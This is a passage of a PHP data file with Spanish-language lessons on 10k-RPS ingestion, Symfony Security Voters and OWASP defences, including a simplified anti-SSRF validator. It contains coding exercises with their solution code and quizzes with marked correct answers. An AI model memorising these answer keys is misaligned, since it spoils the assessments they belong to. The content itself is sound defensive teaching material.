            'status' => 'accepted',
            'event_id' => \$eventId,
            'queued_at' => microtime(true),
        ], Response::HTTP_ACCEPTED);
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior, 10,000 RPS no es una cifra mágica inalcanzable, sino una cuestión de matemáticas y profiling estricto. A 10k RPS, cada milisegundo que un proceso PHP-FPM pasa esperando I/O síncrono consume 10 conexiones simultáneas. La regla de oro: hacer exclusivamente validación en memoria en el hilo HTTP y diferir cualquier cálculo o persistencia de base de datos a colas asíncronas en memoria.',
                    'critical_questions' => [
                        '¿Cuántos procesos worker de PHP-FPM puede albergar nuestra RAM física antes de que el kernel comience a usar Swap de disco?',
                        '¿Estamos usando Unix Domain Sockets para conectar Nginx con PHP-FPM y Redis con PHP para erradicar el overhead TCP?',
                        '¿Qué impacto tiene el garbage collector de PHP en peticiones masivas y cómo diseñamos buffers de bajo ciclo de vida?',
                        '¿Qué política de backpressure aplicamos si los workers asíncronos no dan abasto procesando el buffer de Redis?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Procesar un pico masivo de 10,000 eventos de telemetría por segundo procedentes de dispositivos IoT.',
                    'junior' => [
                        'approach' => 'Inserta cada evento individualmente en MySQL usando Doctrine persist() y flush() en cada petición HTTP, esperando a que la base de datos devuelva el autoincrement ID.',
                        'flaws' => [
                            'Colapso instantáneo del pool de conexiones de MySQL a los 300 concurrentes (Too many connections).',
                            'Latencia de 120ms por petición que satura la cola de Nginx y provoca 502 Bad Gateway masivos.',
                            'I/O de disco al 100% por escrituras transaccionales síncronas individuales en el archivo redo log de InnoDB.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Valida el schema en memoria y encola en Redis mediante lPush en pipeline (< 0.8ms). Responde 202 Accepted. Un grupo de workers de consola lee lotes de 2,000 eventos y los inserta con bulk insert multilínea.',
                        'rationale' => [
                            'Latencia HTTP sub-milisegundo constante sin importar la carga de la base de datos.',
                            'Throughput multiplicado por 50x: una sola conexión a base de datos inserta miles de registros por segundo en lotes.',
                            'Resiliencia: si MySQL entra en mantenimiento 10 segundos, el buffer en Redis absorbe los datos sin perder una sola petición.',
                        ],
                        'trade_offs' => 'Consistencia eventual: los datos tardan entre 1 y 3 segundos en reflejarse en las consultas de MySQL.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Rate Limiter Distribuido con Ventana Deslizante Atómica (SlidingWindowRateLimiter)',
                    'objective' => 'Implementar la clase SlidingWindowRateLimiter que evalúe si una clave ha superado el límite de peticiones permitido dentro de una ventana de tiempo deslizante en segundos, validando parámetros no vacíos ni negativos (InvalidArgumentException) y registrando marcas de tiempo en milisegundos.',
                    'instructions' => 'Completa SlidingWindowRateLimiter: implementa isAllowed(string $key, int $maxRequests, int $windowSeconds): bool. Valida que $key (tras trim) no sea vacía, y que $maxRequests y $windowSeconds sean mayores a 0 (de lo contrario lanza InvalidArgumentException). Calcula el umbral de corte con microtime(true) - $windowSeconds. Filtra las marcas de tiempo que aún están dentro de la ventana; si el número de peticiones vigentes es menor a $maxRequests, añade la marca de tiempo actual (microtime(true)), actualiza el array y retorna true; si ya alcanzó o superó el límite, retorna false. Implementa reset para limpiar claves.',
                    'filename' => 'SlidingWindowRateLimiter.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\SystemDesign\\RateLimiter;\n\nuse InvalidArgumentException;\n\nclass SlidingWindowRateLimiter\n{\n    /**\n     * @var array<string, list<float>>\n     */\n    private array \$requestLogs = [];\n\n    public function isAllowed(string \$key, int \$maxRequests, int \$windowSeconds): bool\n    {\n        // TODO: Validar que \$key no sea vacía (InvalidArgumentException)\n        // TODO: Validar que \$maxRequests > 0 (InvalidArgumentException)\n        // TODO: Validar que \$windowSeconds > 0 (InvalidArgumentException)\n        // TODO: Obtener \$now = microtime(true) y \$windowStart = \$now - \$windowSeconds\n        // TODO: Filtrar marcas de tiempo registradas que sean >= \$windowStart\n        // TODO: Si count < \$maxRequests, añadir \$now, guardar array y retornar true\n        // TODO: De lo contrario retornar false\n        return false;\n    }\n\n    public function reset(string \$key): void\n    {\n        unset(\$this->requestLogs[trim(\$key)]);\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\SystemDesign\\RateLimiter;\n\nuse InvalidArgumentException;\n\nclass SlidingWindowRateLimiter\n{\n    /**\n     * @var array<string, list<float>>\n     */\n    private array \$requestLogs = [];\n\n    public function isAllowed(string \$key, int \$maxRequests, int \$windowSeconds): bool\n    {\n        \$cleanKey = trim(\$key);\n        if (\$cleanKey === '') {\n            throw new InvalidArgumentException('La clave de identificación no puede estar vacía.');\n        }\n\n        if (\$maxRequests <= 0) {\n            throw new InvalidArgumentException('El límite máximo de peticiones debe ser mayor a 0.');\n        }\n\n        if (\$windowSeconds <= 0) {\n            throw new InvalidArgumentException('La ventana de tiempo debe ser mayor a 0 segundos.');\n        }\n\n        \$now = microtime(true);\n        \$windowStart = \$now - (float) \$windowSeconds;\n\n        \$timestamps = \$this->requestLogs[\$cleanKey] ?? [];\n\n        \$validTimestamps = [];\n        foreach (\$timestamps as \$ts) {\n            if (\$ts >= \$windowStart) {\n                \$validTimestamps[] = \$ts;\n            }\n        }\n\n        if (count(\$validTimestamps) < \$maxRequests) {\n            \$validTimestamps[] = \$now;\n            \$this->requestLogs[\$cleanKey] = \$validTimestamps;\n\n            return true;\n        }\n\n        \$this->requestLogs[\$cleanKey] = \$validTimestamps;\n\n        return false;\n    }\n\n    public function reset(string \$key): void\n    {\n        unset(\$this->requestLogs[trim(\$key)]);\n    }\n}\n",
                    'explanation' => 'El algoritmo de Ventana Deslizante (Sliding Window Log) ofrece una precisión matemática superior frente al algoritmo de ventana fija, ya que previene el efecto de borde donde un atacante envía el doble de peticiones en la frontera de dos ventanas. A gran escala, este algoritmo se implementa en Redis usando Sorted Sets (ZADD, ZREMRANGEBYSCORE y ZCARD) de forma completamente atómica.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Alto Rendimiento a 10,000 Requests/sec',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué en entornos de ultra-alta concurrencia (10k RPS) se configura el gestor de procesos de PHP-FPM con `pm = static` en lugar de `pm = dynamic`?',
                            'options' => [
                                'a' => 'Porque pm = static apaga el servidor cuando no hay peticiones.',
                                'b' => 'Porque mantiene un número fijo constante de workers en memoria ya inicializados, eliminando por completo la latencia y consumo de CPU que supone el fork y kill dinámico continuo de procesos en picos de tráfico.',
                                'c' => 'Porque pm = dynamic no compila con PHP 8.4.',
                                'd' => 'Porque pm = static desactiva la recolección de basura.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Bajo tráfico masivo constante, la creación y destrucción dinámica de procesos de PHP-FPM introduce una latencia inaceptable y picos de consumo de CPU. Configurar un pool estático dimensionado a la RAM física disponible proporciona máxima predictibilidad y throughput.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es el beneficio de rendimiento principal de utilizar Redis Pipelining frente a enviar comandos individuales en serie?',
                            'options' => [
                                'a' => 'Reduce el Round-Trip Time (RTT) empaquetando múltiples comandos en una única trama de red TCP en lugar de esperar la confirmación de ida y vuelta para cada comando individual.',
                                'b' => 'Duplica la memoria RAM del servidor Redis automáticamente.',
                                'c' => 'Permite usar Redis sin contraseña.',
                                'd' => 'Convierte las operaciones de Redis en código nativo de C.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'En operaciones secuenciales, el cliente gasta el 90% del tiempo esperando la latencia de red de ida y vuelta (RTT). Pipelining envía 10 o 50 comandos en un solo paquete y lee todas las respuestas de una vez, multiplicando el throughput drásticamente.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué papel juega el código de estado HTTP 202 Accepted en una arquitectura de ingesta de alta frecuencia?',
                            'options' => [
                                'a' => 'Indica que la base de datos relacional completó todas las transacciones en disco.',
                                'b' => 'Confirma al cliente que la petición fue recibida y validada sintácticamente pero su procesamiento y persistencia se realizarán de forma asíncrona en segundo plano, liberando de inmediato la conexión HTTP en menos de 1ms.',
                                'c' => 'Informa al cliente que debe reintentar la petición en 5 minutos.',
                                'd' => 'Es un código de error de protocolo de red.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'HTTP 202 Accepted desacopla el ciclo síncrono del navegador o cliente del almacenamiento pesado. El cliente recibe confirmación instantánea mientras los workers procesan la tarea en background a su propio ritmo sin saturar el frontend.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 12: LECCIÓN 1: Security Voters & Autorización Granular
            // ==========================================
            'security-voters-authorization' => [
                'slug' => 'security-voters-authorization',
                'title' => 'Security Voters & Autorización Granular',
                'module' => 'Seguridad Defensiva',
                'minutes' => 45,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Symfony Voters implementan el patrón de diseño Voter (basado en Chain of Responsibility) para el control de acceso basado en atributos (ABAC - Attribute-Based Access Control) en lugar de simple RBAC (Role-Based Access Control). Mientras que RBAC se limita a verificar roles estáticos del usuario (ROLE_ADMIN), los Voters evalúan condiciones dinámicas y contextuales sobre objetos de dominio específicos: si el usuario es el propietario del recurso, el estado actual de la entidad en su máquina de estados, ventanas temporales y cuotas de uso.',
                    'problem' => 'El antipatrón de la "Lógica de Autorización Dispersa": condiciones de negocio anidadas caóticamente en controladores, repositorios o servicios (if ($user->getId() === $invoice->getOwnerId() && $invoice->isEditable())). Esto genera duplicación de código, fugas de seguridad por Referencia Directa Insegura a Objetos (IDOR) cuando un desarrollador olvida replicar la condición en un endpoint nuevo, e imposibilidad de auditar las reglas de seguridad en un punto unificado.',
                    'solution' => 'Centralización estricta con Symfony VoterInterface / Voter<string, object>. Toda decisión de acceso sobre una entidad se delega a AuthorizationCheckerInterface::isGranted(), evaluando atributos semánticos (INVOICE_VIEW, INVOICE_EDIT, DOCUMENT_PUBLISH). Se desacopla la regla de seguridad del transporte HTTP, permitiendo reutilizarla en controladores, comandos de consola, servicios de dominio y plantillas Twig mediante el filtro is_granted().',
                    'problem_label' => 'El Antipatrón de Autorización Dispersa (Vulnerabilidad IDOR):',
                    'solution_label' => 'La Solución: Symfony Security Voter Centralizado (ABAC):',
                ],
                'internals' => [
                    'title' => 'Mecanismos Internos del AccessDecisionManager y Ciclo de Vida del Voter',
                    'steps' => [
                        [
                            'phase' => '1. AccessDecisionManager y Estrategias de Decisión',
                            'description' => 'El AccessDecisionManager coordina todos los Voters registrados en el contenedor de servicios. Implementa tres estrategias de resolución: Affirmative (basta que un Voter conceda acceso para autorizar, default en Symfony), Consensus (requiere mayoría simple de votos positivos) y Unanimous (requiere que ningún Voter se oponga). Un sistema seguro debe complementarse con la configuración allow_if_all_abstain = false (denegación por defecto).',
                        ],
                        [
                            'phase' => '2. Método supports() y Tipado Estricto en PHP 8.4',
                            'description' => 'El método supports(string $attribute, mixed $subject): bool actúa como guardia de rendimiento. Determina si el Voter tiene competencia sobre el atributo y la entidad consultada. Al usar comprobaciones estrictas de tipos (instanceof, match o in_array), descarta peticiones irrelevantes en microsegundos sin tocar la base de datos.',
                        ],
                        [
                            'phase' => '3. Método voteOnAttribute() y Contexto de Usuario',
                            'description' => 'Si supports() devuelve true, el framework invoca voteOnAttribute(string $attribute, mixed $subject, TokenInterface $token): bool. Se extrae el usuario autenticado del TokenInterface (UserInterface), se verifica su autenticidad y se evalúan las invariantes de negocio de forma determinista.',
                        ],
                        [
                            'phase' => '4. Atributo #[IsGranted] en Controladores',
                            'description' => 'En Symfony 8.1, la autorización se declara limpiamente en la firma de los métodos del controlador mediante el atributo nativo #[IsGranted(attribute: "INVOICE_EDIT", subject: "invoice")]. Si la evaluación falla, el framework lanza automáticamente una AccessDeniedHttpException (HTTP 403 Forbidden).',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Security/Voter/DocumentAccessVoter.php',
                    'title' => 'Voter de Dominio Corporativo con Control de Acceso Basado en Atributos (ABAC)',
                    'tag' => 'Symfony Security Voter & ABAC',
                    'code' => "declare(strict_types=1);

namespace App\Security\Voter;

use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Authorization\Voter\Voter;
use Symfony\Component\Security\Core\User\UserInterface;

class Document
{
    public function __construct(
        private readonly int \$id,
        private readonly int \$ownerId,
        private string \$status = 'draft',
        private bool \$isLocked = false
    ) {}

    public function getId(): int { return \$this->id; }
    public function getOwnerId(): int { return \$this->ownerId; }
    public function getStatus(): string { return \$this->status; }
    public function isLocked(): bool { return \$this->isLocked; }
    public function lock(): void { \$this->isLocked = true; }
}

/**
 * @extends Voter<string, Document>
 */
class DocumentAccessVoter extends Voter
{
    public const string VIEW = 'DOCUMENT_VIEW';
    public const string EDIT = 'DOCUMENT_EDIT';
    public const string DELETE = 'DOCUMENT_DELETE';

    protected function supports(string \$attribute, mixed \$subject): bool
    {
        if (!in_array(\$attribute, [self::VIEW, self::EDIT, self::DELETE], true)) {
            return false;
        }

        return \$subject instanceof Document;
    }

    protected function voteOnAttribute(string \$attribute, mixed \$subject, TokenInterface \$token): bool
    {
        \$user = \$token->getUser();
        if (!\$user instanceof UserInterface) {
            return false;
        }

        /** @var Document \$document */
        \$document = \$subject;

        // Regla global: documentos bloqueados no admiten mutación
        if (\$document->isLocked() && in_array(\$attribute, [self::EDIT, self::DELETE], true)) {
            return false;
        }

        // Super administradores tienen acceso irrestricto
        if (in_array('ROLE_SUPER_ADMIN', \$user->getRoles(), true)) {
            return true;
        }

        return match (\$attribute) {
            self::VIEW => \$this->canView(\$document, \$user),
            self::EDIT => \$this->canEdit(\$document, \$user),
            self::DELETE => \$this->canDelete(\$document, \$user),
            default => false,
        };
    }

    private function canView(Document \$document, UserInterface \$user): bool
    {
        if (in_array('ROLE_AUDITOR', \$user->getRoles(), true)) {
            return true;
        }

        return \$this->isOwner(\$document, \$user);
    }

    private function canEdit(Document \$document, UserInterface \$user): bool
    {
        if (!\$this->isOwner(\$document, \$user)) {
            return false;
        }

        return in_array(\$document->getStatus(), ['draft', 'pending_review'], true);
    }

    private function canDelete(Document \$document, UserInterface \$user): bool
    {
        return \$this->isOwner(\$document, \$user) && \$document->getStatus() === 'draft';
    }

    private function isOwner(Document \$document, UserInterface \$user): bool
    {
        return method_exists(\$user, 'getId') && \$user->getId() === \$document->getOwnerId();
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior, la autenticación responde a la pregunta "¿Quién eres?" y la autorización a "¿Qué tienes permitido hacer con este objeto exacto en este instante?". Nunca se confía en que un simple rol como ROLE_ADMIN o ROLE_USER sea suficiente. Si un usuario intenta editar la factura #450, no basta con saber si tiene rol de cliente; se debe evaluar si la factura le pertenece, si aún no fue pagada y si la empresa no ha cerrado el período fiscal. Los Voters encapsulan esta complejidad en un único lugar testeable y libre de efectos secundarios.',
                    'critical_questions' => [
                        '¿Qué estrategia tiene configurada el AccessDecisionManager (Affirmative, Consensus o Unanimous) y qué sucede si todos los Voters se abstienen?',
                        '¿Estamos aplicando denegación por defecto (deny by default) en todas las ramas de control de acceso?',
                        '¿El método supports() realiza comprobaciones rápidas en memoria sin disparar queries a base de datos?',
                        '¿Están protegidas todas las rutas contra vulnerabilidades IDOR (Insecure Direct Object Reference) mediante Voters o atributos #[IsGranted]?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Controlar el acceso a la edición de un informe financiero que solo puede modificarse por su creador mientras esté en borrador.',
                    'junior' => [
                        'approach' => 'Inserta un bloque if en el método del controlador comprobando el id del usuario de la sesión contra el creador del informe, o simplemente valida si el usuario tiene ROLE_FINANCE.',
                        'flaws' => [
                            'Vulnerabilidad IDOR si se crea un nuevo endpoint de API o comando CLI y se olvida replicar la condición if.',
                            'Acoplamiento absoluto de las reglas de seguridad al controlador HTTP, imposibilitando reutilizarlas en Twig o servicios.',
                            'Imposibilidad de realizar tests unitarios aislados sobre las reglas de autorización.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Implementa un FinancialReportVoter que evalúa atributos REPORT_VIEW y REPORT_EDIT. En el controlador usa #[IsGranted("REPORT_EDIT", subject: "report")] y en Twig condiciona botones con is_granted().',
                        'rationale' => [
                            'Principio de Responsabilidad Única: la regla de autorización reside en una clase especializada y 100% testeable de forma unitaria.',
                            'Defensa en profundidad: si el controlador cambia de ruta o formato (HTML a JSON), la regla de acceso sigue protegiendo el recurso.',
                            'Consistencia global: el UI y el backend utilizan exactamente la misma lógica de autorización.',
                        ],
                        'trade_offs' => 'Requiere registrar clases Voter adicionales y familiaridad con el ciclo de vida del AccessDecisionManager.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de InvoiceAccessVoter con Autorización ABAC',
                    'objective' => 'Implementar la clase InvoiceAccessVoter para gestionar los permisos INVOICE_VIEW e INVOICE_EDIT sobre objetos Invoice, aplicando denegación por defecto, validación estricta de usuario y roles jerárquicos.',
                    'instructions' => 'Completa InvoiceAccessVoter: implementa supports(string $attribute, mixed $subject): bool retornando true solo si $attribute es INVOICE_VIEW o INVOICE_EDIT y $subject es instancia de Invoice. Implementa voteOnAttribute(string $attribute, mixed $subject, ?InvoiceUser $user): bool: si $user es null, retorna false inmediatamente. Si $user posee el rol ROLE_SUPER_ADMIN, retorna true. Para INVOICE_VIEW, retorna true si $user->getId() === $subject->getOwnerId() o si posee ROLE_AUDITOR. Para INVOICE_EDIT, retorna true si $user->getId() === $subject->getOwnerId() y $subject->isEditable() es true. En cualquier otro caso retorna false.',
                    'filename' => 'InvoiceAccessVoter.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Security\\Voter;\n\nclass Invoice\n{\n    public function __construct(\n        private readonly int \$id,\n        private readonly int \$ownerId,\n        private readonly bool \$isEditable = true\n    ) {}\n\n    public function getId(): int { return \$this->id; }\n    public function getOwnerId(): int { return \$this->ownerId; }\n    public function isEditable(): bool { return \$this->isEditable; }\n}\n\nclass InvoiceUser\n{\n    /**\n     * @param list<string> \$roles\n     */\n    public function __construct(\n        private readonly int \$id,\n        private readonly array \$roles = []\n    ) {}\n\n    public function getId(): int { return \$this->id; }\n\n    /**\n     * @return list<string>\n     */\n    public function getRoles(): array { return \$this->roles; }\n\n    public function hasRole(string \$role): bool\n    {\n        return in_array(\$role, \$this->roles, true);\n    }\n}\n\nclass InvoiceAccessVoter\n{\n    public const string VIEW = 'INVOICE_VIEW';\n    public const string EDIT = 'INVOICE_EDIT';\n\n    public function supports(string \$attribute, mixed \$subject): bool\n    {\n        // TODO: Retornar true si \$attribute es VIEW o EDIT y \$subject es instancia de Invoice\n        return false;\n    }\n\n    public function voteOnAttribute(string \$attribute, mixed \$subject, ?InvoiceUser \$user): bool\n    {\n        // TODO: Denegación por defecto si \$user es null\n        // TODO: Si tiene ROLE_SUPER_ADMIN, conceder acceso\n        // TODO: Para VIEW: conceder si es owner o tiene ROLE_AUDITOR\n        // TODO: Para EDIT: conceder si es owner y la factura isEditable()\n        // TODO: En cualquier otro caso retornar false\n        return false;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Security\\Voter;\n\nclass Invoice\n{\n    public function __construct(\n        private readonly int \$id,\n        private readonly int \$ownerId,\n        private readonly bool \$isEditable = true\n    ) {}\n\n    public function getId(): int { return \$this->id; }\n    public function getOwnerId(): int { return \$this->ownerId; }\n    public function isEditable(): bool { return \$this->isEditable; }\n}\n\nclass InvoiceUser\n{\n    /**\n     * @param list<string> \$roles\n     */\n    public function __construct(\n        private readonly int \$id,\n        private readonly array \$roles = []\n    ) {}\n\n    public function getId(): int { return \$this->id; }\n\n    /**\n     * @return list<string>\n     */\n    public function getRoles(): array { return \$this->roles; }\n\n    public function hasRole(string \$role): bool\n    {\n        return in_array(\$role, \$this->roles, true);\n    }\n}\n\nclass InvoiceAccessVoter\n{\n    public const string VIEW = 'INVOICE_VIEW';\n    public const string EDIT = 'INVOICE_EDIT';\n\n    public function supports(string \$attribute, mixed \$subject): bool\n    {\n        if (\$attribute !== self::VIEW && \$attribute !== self::EDIT) {\n            return false;\n        }\n\n        return \$subject instanceof Invoice;\n    }\n\n    public function voteOnAttribute(string \$attribute, mixed \$subject, ?InvoiceUser \$user): bool\n    {\n        if (\$user === null) {\n            return false;\n        }\n\n        if (!\$subject instanceof Invoice) {\n            return false;\n        }\n\n        if (\$user->hasRole('ROLE_SUPER_ADMIN')) {\n            return true;\n        }\n\n        \$isOwner = \$user->getId() === \$subject->getOwnerId();\n\n        return match (\$attribute) {\n            self::VIEW => \$isOwner || \$user->hasRole('ROLE_AUDITOR'),\n            self::EDIT => \$isOwner && \$subject->isEditable(),\n            default => false,\n        };\n    }\n}\n",
                    'explanation' => 'InvoiceAccessVoter implementa control de acceso basado en atributos (ABAC). Aísla las reglas de negocio de la capa de presentación y del controlador, garantizando que nadie pueda visualizar facturas ajenas sin rol de auditor ni modificar facturas bloqueadas, eliminando por completo vulnerabilidades de tipo IDOR.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Security Voters & ABAC en Symfony',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la principal ventaja de ABAC (mediante Voters) sobre un modelo puro de RBAC (Role-Based Access Control)?',
                            'options' => [
                                'a' => 'ABAC no requiere base de datos ni usuarios en el sistema.',
                                'b' => 'ABAC permite evaluar condiciones contextuales sobre el objeto de dominio concreto (como propiedad, estado o fechas), mientras que RBAC solo comprueba si el usuario tiene un rol asignado.',
                                'c' => 'ABAC es compatible únicamente con servidores Apache.',
                                'd' => 'RBAC ya no es compatible con PHP 8.4.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'RBAC solo verifica la etiqueta de rol del usuario. ABAC con Voters evalúa el sujeto de dominio (su propietario, si está bloqueado, si la orden expiró), ofreciendo protección granular contra IDOR.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué ocurre en el ciclo de vida de un Voter si el método supports() devuelve false?',
                            'options' => [
                                'a' => 'Symfony lanza inmediatamente una AccessDeniedException (403).',
                                'b' => 'El Voter se abstiene de votar (ACCESS_ABSTAIN), el AccessDecisionManager no ejecuta voteOnAttribute() para ese Voter y pasa al siguiente Voter registrado.',
                                'c' => 'El servidor PHP reinicia el proceso worker.',
                                'd' => 'Se concede acceso irrestricto de forma automática.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'supports() actúa como filtro previo. Si devuelve false, el Voter se abstiene y no consume tiempo de CPU ejecutando voteOnAttribute(). Otros Voters registrados en la cadena continúan la evaluación.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué estrategia del AccessDecisionManager es la más estricta al requerir que NINGÚN Voter vote en contra para conceder acceso?',
                            'options' => [
                                'a' => 'Affirmative (concede si al menos 1 vota a favor).',
                                'b' => 'Consensus (concede si la mayoría vota a favor).',
                                'c' => 'Unanimous (concede solo si no hay ningún voto en contra y al menos uno a favor).',
                                'd' => 'Random (selecciona al azar).',
                            ],
                            'correct' => 'c',
                            'explanation' => 'La estrategia Unanimous exige unanimidad: si un solo Voter emite ACCESS_DENIED, el acceso se deniega inmediatamente sin importar cuántos otros hayan votado a favor.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 12: LECCIÓN 2: Mitigación Activa de OWASP Top 10
            // ==========================================
            'security-owasp-mitigation' => [
                'slug' => 'security-owasp-mitigation',
                'title' => 'Mitigación Activa de OWASP Top 10',
                'module' => 'Seguridad Defensiva',
                'minutes' => 50,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'La seguridad defensiva en aplicaciones modernas PHP 8.4 y Symfony 8.1 no consiste en parches reactivos, sino en una arquitectura de Defensa en Profundidad (Defense in Depth) aplicada de forma activa a los principales vectores del OWASP Top 10: Inyección SQL (Prepared Statements nativos con PDO), Falsificación de Peticiones del Lado del Servidor (SSRF mediante validación de IPs y filtrado estricto de redes privadas RFC 1918 y metadatos cloud), Cross-Site Scripting (XSS mediante Content Security Policy Level 3 y sanitización contextual) y Gestión Segura de Secretos con Symfony Vault.',
                    'problem' => 'La falsa sensación de seguridad generada por asumir que el framework protege todo automáticamente: desarrolladores que concatenan entradas sin sanitizar en queries nativas o DQL, invocan file_get_contents() o cURL contra URLs provistas por usuarios sin mitigar SSRF (permitiendo robo de credenciales IAM en AWS/GCP mediante 169.254.169.254), y almacenan claves maestras de API y base de datos en texto plano en repositorios de código.',
                    'solution' => 'Implementación de controles defensivos deterministas: 1) Prepared Statements obligatorios con parámetros tipados; 2) Validador de SSRF que resuelve el DNS, rechaza esquemas no autorizados y bloquea IPs en rangos privados/reservados; 3) Cabeceras HTTP de seguridad reforzadas (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options); 4) Cifrado asimétrico de variables de entorno mediante Symfony Secrets/Vault con libsodium.',
                    'problem_label' => 'El Riesgo de Ataques Críticos del OWASP Top 10 (SSRF y SQLi):',
                    'solution_label' => 'La Solución: Arquitectura de Defensa en Profundidad y Firewall SSRF:',
                ],
                'internals' => [
                    'title' => 'Vectores de Ataque OWASP y Mecanismos de Mitigación Criptográfica y de Red',
                    'steps' => [
                        [
                            'phase' => '1. Prevención Determinista de Inyección SQL con Prepared Statements',
                            'description' => 'El motor de base de datos compila el plan de ejecución antes de recibir los datos suministrados por el usuario. Al separar el código SQL de los valores mediante marcadores de posición posicionales o nombrados (:id) con PDO::PARAM_INT o PDO::PARAM_STR, la inyección es matemáticamente imposible a nivel de protocolo de base de datos.',
                        ],
                        [
                            'phase' => '2. Firewall SSRF (Server-Side Request Forgery) y Filtrado de IPs Privadas',
                            'description' => 'Cuando la aplicación consume URLs de terceros (webhooks, avatares, previsualizaciones), se debe inspeccionar el esquema (solo http/https), resolver el nombre de dominio a su IP real mediante gethostbyname(), y verificar que no pertenezca a bucles locales (127.0.0.1), redes privadas RFC 1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) ni rangos de enlace local (169.254.169.254 para AWS Instance Metadata Service).',
                        ],
                        [
                            'phase' => '3. Content Security Policy (CSP) y Erradicación de XSS',
                            'description' => 'La cabecera Content-Security-Policy: default-src \'self\'; object-src \'none\'; script-src \'self\' \'nonce-xxx\' restringe los orígenes autorizados para ejecutar scripts en el navegador del cliente. Incluso si un atacante inyecta HTML, el navegador se negará a ejecutar scripts inline no autorizados.',
                        ],
                        [
                            'phase' => '4. Cifrado Asimétrico de Secretos con Symfony Secrets / Vault',
                            'description' => 'Symfony Vault utiliza la extensión nativa libsodium de PHP para cifrar variables de entorno sensibles (tokens de pago, llaves privadas) con una clave pública que se versiona en el repositorio, mientras que la clave de descifrado permanece aislada en el servidor de producción.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Security/Defense/SafeHttpUrlValidator.php',
                    'title' => 'Validador Defensivo Anti-SSRF con Inspección de DNS y Filtrado de Redes Privadas',
                    'tag' => 'OWASP SSRF Defense & IP Filtering',
                    'code' => "declare(strict_types=1);

namespace App\Security\Defense;

use InvalidArgumentException;
use RuntimeException;

class SafeHttpUrlValidator
{
    private const array ALLOWED_SCHEMES = ['http', 'https'];

    /**
     * Valida que una URL sea segura para ser consultada por el servidor, previniendo ataques SSRF
     *
     * @throws InvalidArgumentException Si la URL o el esquema son inválidos
     * @throws RuntimeException Si el host resuelve a una IP interna, privada o reservada
     */
    public function validateSafeUrl(string \$url): string
    {
        \$trimmed = trim(\$url);
        if (\$trimmed === '' || !filter_var(\$trimmed, FILTER_VALIDATE_URL)) {
            throw new InvalidArgumentException('La URL proporcionada no tiene un formato sintáctico válido.');
        }

        \$scheme = strtolower((string) parse_url(\$trimmed, PHP_URL_SCHEME));
        if (!in_array(\$scheme, self::ALLOWED_SCHEMES, true)) {
            throw new InvalidArgumentException(sprintf('Esquema no permitido \"%s\". Solo se admiten HTTP y HTTPS.', \$scheme));
        }

        \$host = parse_url(\$trimmed, PHP_URL_HOST);
        if (!is_string(\$host) || \$host === '') {
            throw new InvalidArgumentException('No se pudo determinar el host de la URL.');
        }

        // Resolución de DNS para obtener la dirección IP real
        \$ip = gethostbyname(\$host);
        if (\$ip === \$host && !filter_var(\$host, FILTER_VALIDATE_IP)) {
            throw new RuntimeException(sprintf('No fue posible resolver la dirección IP para el host \"%s\".', \$host));
        }

        // Bloqueo estricto de direcciones privadas, reservadas y loopback (RFC 1918, RFC 3927, 169.254.x.x)
        \$isPublicIp = filter_var(
            \$ip,
            FILTER_VALIDATE_IP,
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
        );

        if (\$isPublicIp === false || \$ip === '127.0.0.1' || \$ip === '::1') {
            throw new RuntimeException(sprintf('Acceso bloqueado: El host \"%s\" resuelve a una dirección IP interna o reservada (%s) [Alerta SSRF].', \$host, \$ip));
        }

        return \$trimmed;
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior no ve la seguridad como un checklist de último minuto antes del despliegue, sino como una propiedad matemática del código. Asume una postura de "Zero Trust": cualquier dato proveniente de una petición HTTP, cabecera, cookie, parámetro de URL o incluso respuesta de un microservicio interno se considera potencialmente malicioso hasta que se valida contra una lista blanca (whitelist) estricta. Nunca usa sanitizadores caseros ni regex frágiles cuando existen mecanismos formales y estándares probados en el motor de PHP y el kernel de Symfony.',
                    'critical_questions' => [
                        '¿Nuestra aplicación realiza peticiones HTTP salientes con URLs suministradas por el usuario sin verificar la IP resultante contra 169.254.169.254 (metadatos cloud) o subredes privadas?',
                        '¿Todas las consultas de Doctrine DBAL utilizan Prepared Statements o existe alguna concatenación directa de parámetros en DQL/SQL?',
